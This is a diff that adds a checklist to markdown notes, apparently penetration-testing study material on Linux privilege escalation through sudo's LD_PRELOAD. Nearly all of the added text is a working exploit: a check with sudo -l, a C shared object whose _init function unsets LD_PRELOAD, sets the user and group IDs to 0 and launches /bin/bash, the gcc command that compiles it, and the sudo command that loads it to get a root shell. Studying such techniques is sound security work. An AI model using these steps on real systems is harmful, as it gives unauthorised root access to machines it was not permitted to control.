@@ -50,3 +50,35 @@ sudo LD_PRELOAD=/FULL_PATH/shell.so COMMAND_OR_EXEC
 3. When the system protects against it
 
 
+
+
+# STEP
+- [ ] In command prompt type: 
+- `sudo -l`
+
+- [ ] From the output, notice that the `LD_PRELOAD` environment variable is intact.
+
+- [ ] Open a text editor and type:
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+   unsetenv("LD_PRELOAD");
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+}
+```
+
+  
+
+- [ ] Save the file as x.c
+
+- [ ] In command prompt type:
+- `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
+
+- [ ] In command prompt type:
+- `sudo LD_PRELOAD=/tmp/x.so cmd`
+- `cmd` must be one of the commands we dound with `sudo -l`
